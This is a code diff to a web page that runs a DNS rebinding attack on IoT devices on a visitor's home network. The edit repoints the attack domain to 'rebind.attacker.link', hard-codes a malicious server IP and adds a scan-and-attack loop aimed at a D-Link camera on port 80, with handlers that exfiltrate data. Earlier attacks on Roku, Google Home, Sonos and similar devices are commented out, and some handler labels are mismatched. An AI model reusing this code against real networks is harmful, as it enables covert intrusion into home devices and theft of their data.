@@ -12,8 +12,8 @@
       var _paq = _paq || [];
       /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
       _paq.push(["setDocumentTitle", document.domain + "/" + document.title]);
-      _paq.push(["setCookieDomain", "*.rebind.network"]);
-      _paq.push(["setDomains", ["*.rebind.network"]]);
+      _paq.push(["setCookieDomain", "*.rebind.attacker.link"]);
+      _paq.push(["setDomains", ["*.rebind.attacker.link"]]);
       _paq.push(['trackPageView']);
       _paq.push(['enableLinkTracking']);
       (function() {
@@ -32,7 +32,7 @@
 
 <div id='app'>
     <div class='header'>
-        <h1>DNS Rebinding Attack</h1>
+        <h1>Hila's DNS Rebinding Attack</h1>
         <div>Looking for vulnerable IoT devices on your home network.</div>
         <br>
         <div v-if='ips.length > 1'>Scanning {{ips.length}} IP addresses from {{startIp}} to {{endIp}}</div>
@@ -92,7 +92,10 @@
         launchAttack('192.168.1.1')
     })
 
-    function launchAttack(localIp) {
+    function detectLocalDevices(localIp) {
+	console.log('detectLocalDevices')
+	// foreach device in local network, perform DNS rebinding, get its http response, and detect the device type.
+        // according to the device type we would preform the attack
 
         // convert 192.168.1.1 into array from 192.168.1.0 - 192.168.1.255
         const first3Octets = localIp.substring(0, localIp.lastIndexOf('.'))
@@ -105,14 +108,30 @@
         shuffleArray(ips)
 
         app.ips = ips
+	console.log(`app.ips: ${ app.ips}`)
+    }
+    function launchAttack(localIp) {
 
-        const thermostat = new DNSRebindAttack('rebind.network', 80)
-        const roku = new DNSRebindAttack('rebind.network', 8060)
-        const googleHome = new DNSRebindAttack('rebind.network', 8008)
-        const phillips = new DNSRebindAttack('rebind.network', 80)
-        const sonos = new DNSRebindAttack('rebind.network', 1400)
+	detectLocalDevices(localIp) 
+        const maliciousIP = '3.89.102.59'
+	const port_to_types = {80: ['dlink-camera']}
+        Object.keys(port_to_types).map((port) => {
+		console.log(`launch attack port ${port}`)
+		let attack_obj = new DNSRebindAttack('rebind.attacker.link', port)
+			
+		attack_obj.attack(ips, maliciousIP, port_to_types[port], 200)
+		attack_obj.nodes.on('begin', begin('roku'))
+		attack_obj.nodes.on('destroy', destroy('roku'))
+		attack_obj.nodes.on('exfiltrate', exfiltrate('roku'))
+		
+	});
+        //const thermostat = new DNSRebindAttack('rebind.attacker.link', 80)
+        //const roku = new DNSRebindAttack('rebind.attacker.link', 8060)
+        //const googleHome = new DNSRebindAttack('rebind.attacker.link', 8008)
+        //const phillips = new DNSRebindAttack('rebind.attacker.link', 80)
+        //const sonos = new DNSRebindAttack('rebind.attacker.link', 1400)
 
-        const maliciousIP = '34.192.228.43'
+	/*
         // const maliciousIP = '127.0.0.1'
         googleHome.attack(ips, maliciousIP, 'payloads/google-home.html', 200)
 
@@ -134,9 +153,13 @@
         // when the fourth is done, start the fifth
         phillips.on('all-iframes-added', () => {
             sonos.attack(ips, maliciousIP, 'payloads/sonos-info.html', 200)
-        })
+        })*/
 
-        roku.nodes.on('begin', begin('roku'))
+	
+       
+       /* 
+
+	roku.nodes.on('begin', begin('roku'))
         thermostat.nodes.on('begin', begin('radioThermostat'))
         googleHome.nodes.on('begin', begin('googleHome'))
         phillips.nodes.on('begin', begin('phillips'))
@@ -146,14 +169,15 @@
         thermostat.nodes.on('destroy', destroy('radioThermostat'))
         googleHome.nodes.on('destroy', destroy('googleHome'))
         phillips.nodes.on('destroy', destroy('phillips'))
-        sonos.nodes.on('destroy', destroy('sonos'))
+        sonos.nodes.on('destroy', destroy(
+'sonos'))
 
         roku.nodes.on('exfiltrate', exfiltrate('roku'))
         thermostat.nodes.on('exfiltrate', exfiltrate('radioThermostat'))
         googleHome.nodes.on('exfiltrate', exfiltrate('googleHome'))
         phillips.nodes.on('exfiltrate', exfiltrate('phillips'))
         sonos.nodes.on('exfiltrate', exfiltrate('sonos'))
-
+*/
         function begin(device) {
             return function(ip) {
                 app[device].startedIps.push(ip)
